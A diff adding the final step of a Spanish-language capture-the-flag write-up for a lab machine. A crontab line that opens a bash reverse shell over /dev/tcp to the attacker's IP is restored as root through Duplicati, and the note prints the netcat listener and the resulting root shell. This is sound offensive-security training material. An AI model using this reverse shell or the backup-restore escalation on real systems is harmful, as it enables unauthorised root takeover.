@@ -19,7 +19,7 @@ image: https://github.com/user-attachments/assets/17fc44c9-d486-4d62-aee3-3b1495
 * Cracking hashes (hashcat)
 * SSH Local Port Forwarding
 * Duplicati login bypass
-* 
+* Create backup crontab tu gain root access (Duplicati)
 
 ## Enumeration
 
@@ -710,3 +710,51 @@ Forward en la petición de BurpSuite y pego el NoncePwd en el campo password
 Dejo correr la petición y obtengo acceso al panel de Duplicati
 
 ![imagen](https://github.com/user-attachments/assets/2cc802c7-4454-48e2-9fe2-fa2e1c6cc5eb)
+
+Por último crearé una copia de seguridad de de un archivo malicioso el cual contiene un crontab que ejecuta cada minutos una reverse sell hacía mi máquina de atacante.
+
+```bash
+marcus@monitorsthree:/tmp$ cat rce 
+* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.194/1234 0>&1"
+```
+
+Utilizo netcat para iniciar un listener por el puerto 1234 y obtener una reverse shell
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+```
+
+Configuro un nuevo backup en Duplicati y seguido restauro
+
+![imagen](https://github.com/user-attachments/assets/ca089566-8bbd-4618-8ec3-4c3a7d3e97c1)
+
+![imagen](https://github.com/user-attachments/assets/c9e3db1d-6005-441d-a8f5-38a59ed8c539)
+
+![imagen](https://github.com/user-attachments/assets/373d1160-0b9e-40d6-be64-44faacd6192c)
+
+![imagen](https://github.com/user-attachments/assets/f068d048-7bfb-4cc7-825c-d61e03bac67b)
+
+![imagen](https://github.com/user-attachments/assets/7113dec4-9112-4d2e-866d-fcea3532976e)
+
+![imagen](https://github.com/user-attachments/assets/ecc6eb1f-ebcb-4f80-8ba9-c351a58fa2af)
+
+![imagen](https://github.com/user-attachments/assets/aa17850a-114e-4458-a453-17ad9b32af75)
+
+![imagen](https://github.com/user-attachments/assets/927ca398-a02b-4e44-a7e0-b32842be0805)
+
+![imagen](https://github.com/user-attachments/assets/3bbe7ea0-9511-47e0-9536-ce07f1963c8e)
+
+![imagen](https://github.com/user-attachments/assets/2b42fa33-ad10-41ba-ba89-0dbda5822cec)
+
+Obtengo la reverse shell como el usuario root
+
+```bash
+nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.194] from (UNKNOWN) [10.10.11.30] 33954
+bash: cannot set terminal process group (7600): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitorsthree:~# whoami
+root
+```
